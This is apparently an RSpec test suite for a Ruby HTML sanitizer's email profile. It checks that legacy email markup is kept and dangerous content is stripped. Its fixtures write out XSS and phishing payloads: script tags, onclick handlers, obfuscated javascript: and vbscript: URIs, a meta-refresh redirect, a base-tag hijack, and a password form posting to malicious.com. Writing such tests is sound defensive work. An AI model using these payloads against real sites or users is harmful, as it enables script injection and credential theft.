# frozen_string_literal: true

require 'rspec'
require 'scrubber'

RSpec.describe Scrubber do
  describe 'HTML Email Profile' do
    before do
      described_class.set_config(use_profiles: { html_email: true })
    end

    after do
      described_class.clear_config
    end

    let(:email_html) do
      <<~HTML
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="utf-8">
          <title>Marketing Email</title>
          <style>
            .container { width: 100%; background-color: #f0f0f0; }
            .content { padding: 20px; }
          </style>
        </head>
        <body bgcolor="#ffffff" text="#000000" link="#0000ff">
          <center>
            <table width="600" cellpadding="0" cellspacing="0" border="0">
              <tr>
                <td align="center" valign="top">
                  <font face="Arial, sans-serif" size="3" color="#333333">
                    <h1>Welcome!</h1>
                    <p>This is a <strong>marketing</strong> email.</p>
                    <a href="https://example.com" target="_blank">Click here</a>
                  </font>
                </td>
              </tr>
            </table>
          </center>
          <script>alert('xss')</script>
          <form action="/steal"><input type="text"></form>
          <iframe src="http://malicious.com"></iframe>
        </body>
        </html>
      HTML
    end

    it 'preserves document structure (html, head, body)' do
      clean = described_class.sanitize(email_html)
      expect(clean).to include('<html>')
      expect(clean).to include('<head>')
      expect(clean).to include('<body')
    end

    it 'preserves style tags' do
      clean = described_class.sanitize(email_html)
      expect(clean).to include('<style>')
      expect(clean).to include('.container { width: 100%; background-color: #f0f0f0; }')
    end

    it 'preserves legacy presentation tags (center, font)' do
      clean = described_class.sanitize(email_html)
      expect(clean).to include('<center>')
      expect(clean).to include('<font face="Arial, sans-serif"')
    end

    it 'preserves legacy attributes (bgcolor, width, cellpadding)' do
      clean = described_class.sanitize(email_html)
      expect(clean).to include('bgcolor="#ffffff"')
      expect(clean).to include('width="600"')
      expect(clean).to include('cellpadding="0"')
    end

    it 'preserves target attribute on links' do
      clean = described_class.sanitize(email_html)
      expect(clean).to include('target="_blank"')
    end

    it 'removes dangerous tags (script, form, iframe)' do
      clean = described_class.sanitize(email_html)
      expect(clean).not_to include('<script>')
      expect(clean).not_to include('alert(\'xss\')')
      expect(clean).not_to include('<form')
      expect(clean).not_to include('<iframe')
    end

    it 'removes dangerous attributes' do
      email_html = '<a href="https://example.com" onclick="stealCookies()">Click me</a>'
      clean = described_class.sanitize(email_html)
      expect(clean).to include('href="https://example.com"')
      expect(clean).not_to include('onclick')
    end

    context 'when processing sophisticated marketing email' do
      let(:marketing_html) do
        <<~HTML
          <!DOCTYPE html>
          <html>
          <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
              #body { background-color: #f0f0f0; }
              #content-table { width: 100%; }
              .header { color: #333; }
            </style>
          </head>
          <body id="body">
            <table id="content-table">
              <tbody>
                <tr>
                  <td class="header">Special Offer</td>
                </tr>
              </tbody>
            </table>
          </body>
          </html>
        HTML
      end

      it 'preserves complex structure and styling' do
        clean = described_class.sanitize(marketing_html)
        expect(clean).to include('<meta name="viewport" content="width=device-width, initial-scale=1.0">')
        expect(clean).to include('#body { background-color: #f0f0f0; }')
        expect(clean).to include('#content-table { width: 100%; }')
        expect(clean).to include('<body id="body">')
        expect(clean).to include('<table id="content-table">')
      end
    end

    context 'when handling phishing and malicious attacks' do
      it 'removes meta refresh redirects' do
        phishing_html = '<html><head><meta http-equiv="refresh" content="0;url=http://malicious.com"></head><body></body></html>'
        clean = described_class.sanitize(phishing_html)
        # http-equiv is not in the allowed attributes list for HTML_EMAIL
        expect(clean).not_to include('http-equiv')
        expect(clean).not_to include('refresh')
      end

      it 'removes obfuscated javascript URIs' do
        attacks = [
          "<a href=\"j\navascript:alert(1)\">Click</a>",
          "<a href=\"java\tscript:alert(1)\">Click</a>",
          '<a href="javascript&#58;alert(1)">Click</a>',
          '<a href="vbscript:alert(1)">Click</a>'
        ]
        attacks.each do |attack|
          clean = described_class.sanitize(attack)
          expect(clean).not_to include('javascript:')
          expect(clean).not_to include('vbscript:')
          expect(clean).not_to include('alert(1)')
        end
      end

      it 'removes base tag hijacking' do
        # base tag is not in HTML_EMAIL tags
        phishing_html = '<html><head><base href="http://malicious.com/"></head>' \
                        '<body><a href="login">Login</a></body></html>'
        clean = described_class.sanitize(phishing_html)
        expect(clean).not_to include('<base')
      end

      it 'removes form hijacking' do
        phishing_html = '<form action="http://malicious.com/steal"><input type="password" name="pass"></form>'
        clean = described_class.sanitize(phishing_html)
        expect(clean).not_to include('<form')
        expect(clean).not_to include('<input')
      end
    end

    it 'removes dangerous attributes (onclick)' do
      dirty = '<a href="#" onclick="steal()">Click</a>'
      clean = described_class.sanitize(dirty)
      expect(clean).not_to include('onclick')
    end

    it 'removes javascript: URIs' do
      dirty = '<a href="javascript:alert(1)">Click</a>'
      clean = described_class.sanitize(dirty)
      expect(clean).not_to include('javascript:')
    end
  end
end
